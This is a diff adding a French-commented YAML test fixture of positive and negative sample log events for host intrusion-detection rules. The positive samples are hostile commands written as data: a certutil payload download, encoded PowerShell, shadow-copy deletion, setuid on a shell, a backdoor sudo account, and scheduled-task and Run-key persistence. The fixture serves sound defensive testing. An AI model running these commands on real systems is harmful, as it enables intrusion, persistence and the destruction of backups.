@@ -1,0 +1,60 @@
+# Événements de test : chaque règle doit détecter ses cas « positifs » et ignorer ses cas « negatifs ».
+# Champs Linux : program, message (journal syslog). Champs Windows : Image, CommandLine (Sysmon 1).
+creation_compte_local:
+  positifs:
+    - {program: useradd, message: "new user: name=backdoor, UID=1001, GID=1001, home=/home/backdoor, shell=/bin/bash, from=/dev/pts/0"}
+  negatifs:
+    - {program: useradd, message: "new group: name=docker, GID=999"}
+    - {program: sshd, message: "new user: name=x"}
+ajout_groupe_sudo:
+  positifs:
+    - {program: usermod, message: "add 'backdoor' to group 'sudo'"}
+    - {program: gpasswd, message: "user backdoor added by root to group 'wheel'"}
+  negatifs:
+    - {program: usermod, message: "add 'alice' to group 'docker'"}
+modification_crontab:
+  positifs:
+    - {program: crontab, message: "(root) REPLACE (root)"}
+    - {program: crontab, message: "(alice) BEGIN EDIT (alice)"}
+  negatifs:
+    - {program: crontab, message: "(root) LIST (root)"}
+    - {program: CRON, message: "(root) CMD (run-parts /etc/cron.hourly)"}
+ssh_echecs_repetes:
+  positifs:
+    - {program: sshd, message: "Failed password for root from 203.0.113.7 port 52211 ssh2"}
+    - {program: sshd, message: "Invalid user admin from 203.0.113.7 port 52212"}
+  negatifs:
+    - {program: sshd, message: "Accepted publickey for alice from 192.0.2.10 port 50122 ssh2"}
+setuid_via_sudo:
+  positifs:
+    - {program: sudo, message: "alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/chmod u+s /tmp/bash"}
+    - {program: sudo, message: "alice : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/chmod 4755 /tmp/sh"}
+  negatifs:
+    - {program: sudo, message: "alice : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/chmod 755 /tmp/script.sh"}
+powershell_encodee:
+  positifs:
+    - {Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', CommandLine: 'powershell.exe -NoP -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA'}
+    - {Image: 'C:\Program Files\PowerShell\7\pwsh.exe', CommandLine: 'pwsh -EncodedCommand ZQBjAGgAbwAgAGgAaQA='}
+  negatifs:
+    - {Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', CommandLine: 'powershell.exe -File C:\scripts\inventaire.ps1'}
+certutil_telechargement:
+  positifs:
+    - {Image: 'C:\Windows\System32\certutil.exe', CommandLine: 'certutil -urlcache -split -f http://198.51.100.5/a.exe C:\Users\Public\a.exe'}
+  negatifs:
+    - {Image: 'C:\Windows\System32\certutil.exe', CommandLine: 'certutil -hashfile C:\temp\setup.msi SHA256'}
+suppression_cliches_vss:
+  positifs:
+    - {Image: 'C:\Windows\System32\vssadmin.exe', CommandLine: 'vssadmin.exe delete shadows /all /quiet'}
+    - {Image: 'C:\Windows\System32\wbem\WMIC.exe', CommandLine: 'wmic shadowcopy delete'}
+  negatifs:
+    - {Image: 'C:\Windows\System32\vssadmin.exe', CommandLine: 'vssadmin list shadows'}
+tache_planifiee_creee:
+  positifs:
+    - {Image: 'C:\Windows\System32\schtasks.exe', CommandLine: 'schtasks /create /sc onlogon /tn MiseAJour /tr C:\Users\Public\a.exe'}
+  negatifs:
+    - {Image: 'C:\Windows\System32\schtasks.exe', CommandLine: 'schtasks /query /fo LIST'}
+cle_run_registre:
+  positifs:
+    - {Image: 'C:\Windows\System32\reg.exe', CommandLine: 'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MiseAJour /d C:\Users\Public\a.exe'}
+  negatifs:
+    - {Image: 'C:\Windows\System32\reg.exe', CommandLine: 'reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run'}
